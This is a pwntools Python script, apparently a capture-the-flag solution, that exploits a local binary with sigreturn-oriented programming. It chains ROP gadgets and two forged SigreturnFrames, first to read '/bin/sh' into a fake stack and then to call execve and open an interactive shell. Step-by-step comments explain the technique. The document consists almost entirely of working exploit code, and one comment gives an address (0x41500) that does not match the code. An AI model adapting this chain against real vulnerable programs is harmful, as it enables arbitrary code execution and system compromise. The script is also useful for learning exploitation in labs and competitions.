from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)
r = ROP(e)

p = process(e.path)

'''
sigreturn syscall is used in signal handling 
when program recieve a signal, kernel saves current process state on stack
if trigger a sigreturn syscall when it is done, it expects there to be a saved frame on the stack
we want to mimick this state/frame saved by the kernel to pass our own to execute syscalls
In this exploit:
1st stage - call sigreturn, push frame with read syscall ready ontop of stack
2nd stage - send '/bin/sh' read by read() syscall to the fake stack, call sigreturn, push execve frame onto stack
'''

# in radare `0x00041000   0x1a -rwx PROGBITS .shellcode`
# but if look in pwndbg there is data there (x/100s 0x41000)
# just keep looking forward until find a big empty piece (# pwndbg > x/100s 0x41300)
fake_stack = 0x41300 
syscall_ret = r.find_gadget(['syscall', 'ret'])[0]
pop_rax = r.find_gadget(['pop rax', 'ret'])[0]

stage1 = '''read(rdi=0x0, rsi=0x41300, rdx=0x1000) '''
frame = SigreturnFrame()                  # this is the frame that will be read off the stack after sigreturn syscall
frame.rax = constants.SYS_read            # rax = 0x0 (opcode for read syscall)
frame.rdi = 0x0                           # rdi = stdin (0x0)
frame.rsi = fake_stack                    # rsi = fake stack (0x41300->'/bin/sh')
frame.rdx = 0x1000                        # rdx = size to read in
frame.rip = syscall_ret                   # this makes it execute read after sigreturn
frame.rsp = fake_stack+0x8                # after syscall execution continues from fake_stack + 0x8

chain = cyclic(8)                
chain += p64(pop_rax)            
chain += p64(constants.SYS_rt_sigreturn)  # rax = SYS_rt_sigreturn (0xf)
chain += p64(syscall_ret)                 # syscall -> rax = sigreturn (0xf)
chain += bytes(frame)                     # after sigreturn, expects to find a signal frame on the stack

log.info(f"hit enter to send stage 1\n{stage1}")
pause()

p.sendline(chain)

stage2 = '''execve(rdi=0x41500->/bin/sh, rsi=0x0=NULL, rdx=0x0=NULL) '''
frame = SigreturnFrame()                  # this is the frame that will be read off the stack after sigreturn syscall
frame.rax = constants.SYS_execve          # rax = 0x3b (opcode for execve syscall)
frame.rdi = fake_stack                    # rdi = fake_stack (0x41300->'/bin/sh')
frame.rsi = 0x0                           # rsi = 0x0
frame.rdx = 0x0                           # rdx = 0x0
frame.rip = syscall_ret                   # this makes it execute execve after sigreturn

chain = b'/bin/sh\0'                      # '/bin/sh' read by read() to fake_stack (0x41300)
chain += p64(pop_rax)                     
chain += p64(constants.SYS_rt_sigreturn)  # rax = SYS_rt_sigreturn (0xf)
chain += p64(syscall_ret)                 # syscall -> rax = sigreturn (0xf)
chain += bytes(frame)                     # execve(rdi->/bin/sh, rsi=NULL, rdx=NULL)

log.info(f"hit enter to send stage 2\n{stage2}")
pause()
p.sendline(chain)

p.interactive()
